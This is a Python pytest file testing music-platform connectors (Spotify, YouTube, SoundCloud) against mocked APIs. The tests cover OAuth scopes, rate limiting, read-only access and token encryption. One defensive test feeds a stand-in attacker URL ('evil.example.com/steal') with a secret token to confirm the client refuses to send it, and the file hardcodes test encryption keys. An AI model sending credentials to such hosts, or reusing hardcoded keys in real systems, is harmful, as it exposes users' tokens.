"""Connectoren gegen nachgebildete API-Antworten (kein Netz)."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from urllib.parse import parse_qs, urlsplit

import httpx
import pytest

from fake_platforms import API_HOSTS, TOKEN_HOSTS, FakePlatforms
from musichub.connections.crypto import TokenCipher, TokenCipherError
from musichub.connectors.base import (
    ConnectorAccessError,
    ConnectorAuthError,
    ConnectorError,
    ConnectorNotConfiguredError,
    ConnectorNotImplementedError,
    OAuthTokens,
    RateLimitedError,
    RemoteAccount,
)
from musichub.connectors.http import ApiClient
from musichub.connectors.soundcloud import SoundCloudConnector
from musichub.connectors.spotify import SpotifyConnector
from musichub.connectors.youtube import (
    YouTubeConnector,
    parse_iso_duration,
    seconds_until_quota_reset,
)
from musichub.core.config import Settings
from musichub.domain.types import Platform

KEY = "Hm9fiOmSQynb6d0_JpW2FxA-fnmzLHi4_a5yCIhE9A4="


@pytest.fixture
def settings() -> Settings:
    return Settings(
        spotify_client_id="sp-id",
        spotify_client_secret="sp-secret",  # type: ignore[arg-type]
        youtube_client_id="yt-id",
        youtube_client_secret="yt-secret",  # type: ignore[arg-type]
        soundcloud_client_id="sc-id",
        soundcloud_client_secret="sc-secret",  # type: ignore[arg-type]
        public_url="https://music.example.com",
        token_encryption_key=KEY,  # type: ignore[arg-type]
    )


@pytest.fixture
def fake() -> FakePlatforms:
    return FakePlatforms()


def query(url: str) -> dict[str, str]:
    return {k: v[0] for k, v in parse_qs(urlsplit(url).query).items()}


# --- Spotify ------------------------------------------------------------------------------------


def test_spotify_authorization_requests_only_read_scopes(settings: Settings) -> None:
    url = SpotifyConnector(settings).authorization_url(
        state="st", code_challenge="cc", redirect_uri="https://music.example.com/cb"
    )
    q = query(url)
    assert url.startswith("https://accounts.spotify.com/authorize?")
    assert q["scope"].split() == ["playlist-read-private", "playlist-read-collaborative"]
    assert q["state"] == "st" and q["response_type"] == "code"
    assert "modify" not in url


def test_spotify_code_exchange_uses_basic_auth(settings: Settings, fake: FakePlatforms) -> None:
    c = SpotifyConnector(settings, transport=fake.transport)
    tokens = c.exchange_code(code="good-code", code_verifier="v", redirect_uri="https://x/cb")
    assert tokens.access_token == "access-1" and tokens.refresh_token == "refresh-1"
    assert tokens.expires_at and tokens.expires_at > datetime.now(UTC)
    request = fake.requests[-1]
    assert request.url.host == "accounts.spotify.com"
    assert request.headers["Authorization"].startswith("Basic ")
    assert b"sp-secret" not in request.content
    with pytest.raises(ConnectorAuthError):
        c.exchange_code(code="bad", code_verifier="v", redirect_uri="https://x/cb")
    # Erneuern ohne neues Refresh-Token behält das alte
    refreshed = c.refresh_tokens("refresh-1")
    assert refreshed.refresh_token == "refresh-1"


def test_spotify_playlists_and_items(settings: Settings, fake: FakePlatforms) -> None:
    c = SpotifyConnector(settings, transport=fake.transport)
    account = c.get_account("access-1")
    assert account == RemoteAccount("silas", "Silas")
    playlists = c.list_playlists("access-1", account)
    assert [p.external_id for p in playlists] == ["pl_own", "pl_foreign"]  # zwei Seiten
    own, foreign = playlists
    assert own.owned and own.items_accessible and own.version == "snap1" and own.track_count == 3
    assert not foreign.owned and not foreign.items_accessible

    pages = list(c.iter_playlist_tracks("access-1", "pl_own"))
    tracks = [t for p in pages for t in p.tracks]
    assert len(pages) == 2 and pages[0].total == 4
    first, second, local, gone = tracks
    assert first.title == "Song 1" and first.isrc == "GBAAA2600001"
    assert first.release_date == "2024-05-17" and first.album == "Album"
    assert second.external_id == "0" * 21 + "2"  # Feld „track“ wird weiter gelesen
    assert local.external_id == "" and local.note and "Lokale Datei" in local.note
    assert not gone.available and gone.title == ""


def test_spotify_foreign_playlist_items_are_forbidden(
    settings: Settings, fake: FakePlatforms
) -> None:
    c = SpotifyConnector(settings, transport=fake.transport)
    with pytest.raises(ConnectorAccessError) as err:
        list(c.iter_playlist_tracks("access-1", "pl_foreign"))
    assert "Development Mode" in err.value.message
    assert not err.value.retryable


def test_spotify_get_tracks_one_by_one(settings: Settings, fake: FakePlatforms) -> None:
    c = SpotifyConnector(settings, transport=fake.transport)
    result = c.get_tracks("access-1", ["0" * 21 + "1", "0" * 21 + "9"])
    assert result["0" * 21 + "1"] is not None
    assert result["0" * 21 + "9"] is None
    assert [r.url.path for r in fake.api_requests()] == [
        "/v1/tracks/" + "0" * 21 + "1",
        "/v1/tracks/" + "0" * 21 + "9",
    ]


def test_spotify_release_date_only_with_day_precision(settings: Settings) -> None:
    c = SpotifyConnector(settings)
    data = {
        "id": "x" * 22,
        "name": "A",
        "artists": [{"name": "B"}],
        "album": {"name": "C", "release_date": "1999", "release_date_precision": "year"},
    }
    assert c._map_track(data).release_date is None


# --- Rate-Limits, Fehler, Sicherheit des HTTP-Clients -------------------------------------------


def _client(handler: httpx.MockTransport, sleeps: list[float]) -> ApiClient:
    return ApiClient(
        Platform.SPOTIFY,
        "https://api.spotify.com/v1",
        timeout=5,
        transport=handler,
        sleep=sleeps.append,
    )


def test_short_retry_after_is_waited_inline() -> None:
    calls: list[int] = []

    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(1)
        if len(calls) == 1:
            return httpx.Response(429, headers={"Retry-After": "2"})
        return httpx.Response(200, json={"ok": True})

    sleeps: list[float] = []
    assert _client(httpx.MockTransport(handler), sleeps).get("me", "t") == {"ok": True}
    assert sleeps == [2.0]


def test_long_retry_after_is_passed_to_the_job() -> None:
    sleeps: list[float] = []
    transport = httpx.MockTransport(lambda r: httpx.Response(429, headers={"Retry-After": "120"}))
    with pytest.raises(RateLimitedError) as err:
        _client(transport, sleeps).get("me", "t")
    assert err.value.retry_after == 120 and err.value.retryable and sleeps == []


def test_server_errors_are_retried_then_reported() -> None:
    sleeps: list[float] = []
    transport = httpx.MockTransport(lambda r: httpx.Response(503, json={}))
    with pytest.raises(ConnectorError) as err:
        _client(transport, sleeps).get("me", "t")
    assert err.value.retryable and sleeps == [1, 2]


def test_token_is_never_sent_to_foreign_hosts() -> None:
    seen: list[httpx.Request] = []
    transport = httpx.MockTransport(lambda r: seen.append(r) or httpx.Response(200, json={}))
    with pytest.raises(ConnectorError):
        _client(transport, []).get("https://evil.example.com/steal", "secret-token")
    assert seen == []


def test_errors_and_reprs_do_not_contain_tokens() -> None:
    tokens = OAuthTokens("very-secret-access", "very-secret-refresh", None)
    assert "very-secret" not in repr(tokens)
    transport = httpx.MockTransport(
        lambda r: httpx.Response(401, json={"error": {"message": "bad token"}})
    )
    with pytest.raises(ConnectorAuthError) as err:
        _client(transport, []).get("me", "very-secret-access")
    assert "very-secret" not in str(err.value)


# --- YouTube ------------------------------------------------------------------------------------


def test_youtube_authorization_is_read_only_with_pkce(settings: Settings) -> None:
    q = query(
        YouTubeConnector(settings).authorization_url(
            state="st", code_challenge="cc", redirect_uri="https://music.example.com/cb"
        )
    )
    assert q["scope"] == "https://www.googleapis.com/auth/youtube.readonly"
    assert q["access_type"] == "offline" and q["code_challenge_method"] == "S256"


def test_youtube_playlists_items_and_durations(settings: Settings, fake: FakePlatforms) -> None:
    c = YouTubeConnector(settings, transport=fake.transport)
    account = c.get_account("access-1")
    assert account.external_id == "UCsilas"
    (playlist,) = c.list_playlists("access-1", account)
    assert playlist.external_id == "PLmix" and playlist.track_count == 3
    tracks = [t for p in c.iter_playlist_tracks("access-1", "PLmix") for t in p.tracks]
    kerala, deleted, city = tracks
    assert kerala.artists == ("Bonobo",)  # „ - Topic“ entfernt
    assert kerala.duration_ms == 230_000
    assert not deleted.available and deleted.title == ""
    assert city.artists == ("M83VEVO",) and city.duration_ms == 244_000
    # videos.list wird gebündelt (eine Anfrage für alle Videos der Seite)
    assert [r.url.path.rsplit("/", 1)[-1] for r in fake.api_requests()].count("videos") == 1


def test_youtube_quota_exhaustion_waits_until_reset(
    settings: Settings, fake: FakePlatforms
) -> None:
    fake.yt_quota_exhausted = True
    c = YouTubeConnector(settings, transport=fake.transport)
    with pytest.raises(RateLimitedError) as err:
        c.list_playlists("access-1", RemoteAccount("x", "x"))
    assert err.value.retry_after and err.value.retry_after > 60
    assert "Kontingent" in err.value.message


def test_youtube_revoke(settings: Settings, fake: FakePlatforms) -> None:
    c = YouTubeConnector(settings, transport=fake.transport)
    assert c.revoke(OAuthTokens("access-1", "refresh-1", None))
    assert fake.revoked == ["refresh-1"]


@pytest.mark.parametrize(
    ("value", "ms"),
    [("PT3M50S", 230_000), ("PT1H2M3S", 3_723_000), ("PT45S", 45_000), ("P0D", None), ("", None)],
)
def test_parse_iso_duration(value: str, ms: int | None) -> None:
    assert parse_iso_duration(value) == ms


def test_quota_reset_is_after_midnight_pacific() -> None:
    # 07:30 UTC = 23:30 PST -> etwas über 30 Minuten
    wait = seconds_until_quota_reset(datetime(2026, 1, 15, 7, 30, tzinfo=UTC))
    assert 30 * 60 < wait < 35 * 60


# --- SoundCloud ---------------------------------------------------------------------------------


def test_soundcloud_without_credentials_stays_disabled() -> None:
    c = SoundCloudConnector(Settings())
    assert not c.is_configured()
    with pytest.raises(ConnectorNotConfiguredError):
        c.authorization_url(state="s", code_challenge="c", redirect_uri="https://x/cb")


def test_soundcloud_with_credentials(settings: Settings, fake: FakePlatforms) -> None:
    c = SoundCloudConnector(settings, transport=fake.transport)
    q = query(c.authorization_url(state="s", code_challenge="cc", redirect_uri="https://x/cb"))
    assert q["code_challenge_method"] == "S256" and "scope" not in q
    account = c.get_account("access-1")
    assert account.external_id == "soundcloud:users:1"
    (playlist,) = c.list_playlists("access-1", account)
    tracks = [t for p in c.iter_playlist_tracks("access-1", playlist.external_id) for t in p.tracks]
    assert tracks[0].external_id == "deadmau5/strobe" and tracks[0].artists == ("deadmau5",)
    assert not tracks[1].available
    assert all(r.headers["Authorization"].startswith("OAuth ") for r in fake.api_requests())


# --- Nur lesend ---------------------------------------------------------------------------------


def test_connectors_never_write_to_platform_apis(settings: Settings, fake: FakePlatforms) -> None:
    for connector in (
        SpotifyConnector(settings, transport=fake.transport),
        YouTubeConnector(settings, transport=fake.transport),
        SoundCloudConnector(settings, transport=fake.transport),
    ):
        tokens = connector.exchange_code(
            code="good-code", code_verifier="v", redirect_uri="https://x"
        )
        account = connector.get_account(tokens.access_token)
        for playlist in connector.list_playlists(tokens.access_token, account):
            if playlist.items_accessible:
                list(connector.iter_playlist_tracks(tokens.access_token, playlist.external_id))
        connector.refresh_tokens("refresh-1")
        with pytest.raises(ConnectorNotImplementedError):
            connector.create_playlist("x")
        with pytest.raises(ConnectorNotImplementedError):
            connector.replace_playlist_tracks("x", ["1"])
    assert fake.api_requests(), "Erwartet API-Aufrufe"
    assert {r.method for r in fake.api_requests()} == {"GET"}
    assert {r.url.host for r in fake.requests if r.method != "GET"} <= TOKEN_HOSTS
    assert {r.url.host for r in fake.requests} <= API_HOSTS | TOKEN_HOSTS


# --- Verschlüsselung ----------------------------------------------------------------------------


def test_token_cipher_roundtrip_and_rotation() -> None:
    old = TokenCipher([KEY])
    secret = old.encrypt("access-token")
    assert "access-token" not in secret
    new_key = "gNDN8xY2gY0jGqzq9fA4j3fWQ2u2Qk9iS2CqG1lW0Qk="
    rotated = TokenCipher([new_key, KEY])
    assert rotated.decrypt(secret) == "access-token"
    with pytest.raises(TokenCipherError):
        TokenCipher([new_key]).decrypt(secret)
    with pytest.raises(TokenCipherError):
        TokenCipher([])
    with pytest.raises(TokenCipherError):
        TokenCipher(["zu-kurz"])


# --- Schreiben (nur Synchronisierung) -------------------------------------------------------------


def test_spotify_write_chunks_and_scopes(settings: Settings, fake: FakePlatforms) -> None:
    c = SpotifyConnector(settings, transport=fake.transport)
    url = c.authorization_url(
        state="s", code_challenge="c", redirect_uri="https://x/cb", write=True
    )
    assert "playlist-modify-private" in query(url)["scope"]
    assert "user-library-modify" not in query(url)["scope"]  # nie Bibliothek
    assert c.has_write_scope("playlist-read-private playlist-modify-private playlist-modify-public")
    assert not c.has_write_scope("playlist-read-private playlist-read-collaborative")
    created = c.create_remote_playlist("access-1", "Neu", None)
    ids = [f"{n:0>22}" for n in range(1, 151)]
    c.replace_playlist("access-1", created.external_id, ids)
    methods = [
        (r.method, len(json.loads(r.content).get("uris", [])))
        for r in fake.requests
        if r.method in {"PUT", "POST"} and r.url.path.endswith("/items")
    ]
    assert methods == [("PUT", 100), ("POST", 50)]
    assert len(fake.sp_contents[created.external_id]) == 150
    body = json.loads(
        next(
            r for r in fake.requests if r.url.path == "/v1/me/playlists" and r.method == "POST"
        ).content
    )
    assert body["public"] is False  # neue Playlists sind privat


def test_youtube_write_scope_and_private_playlist(settings: Settings, fake: FakePlatforms) -> None:
    c = YouTubeConnector(settings, transport=fake.transport)
    url = c.authorization_url(
        state="s", code_challenge="c", redirect_uri="https://x/cb", write=True
    )
    assert query(url)["scope"] == "https://www.googleapis.com/auth/youtube"
    created = c.create_remote_playlist("access-1", "Neu", "Beschreibung")
    body = json.loads(fake.requests[-1].content)
    assert body["status"]["privacyStatus"] == "private"
    c.add_to_playlist("access-1", created.external_id, ["vidAAAAAAAA"])
    tracks = [t for p in c.iter_playlist_tracks("access-1", created.external_id) for t in p.tracks]
    assert tracks[0].item_id and tracks[0].external_id == "vidAAAAAAAA"


def test_write_timeout_is_not_retried() -> None:
    calls: list[int] = []

    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(1)
        raise httpx.ReadTimeout("langsam")

    client = ApiClient(
        Platform.SPOTIFY,
        "https://api.spotify.com/v1",
        timeout=1,
        transport=httpx.MockTransport(handler),
    )
    with pytest.raises(ConnectorError) as err:
        client.write("POST", "playlists/x/items", "t", json={"uris": []})
    assert not err.value.retryable and calls == [1]
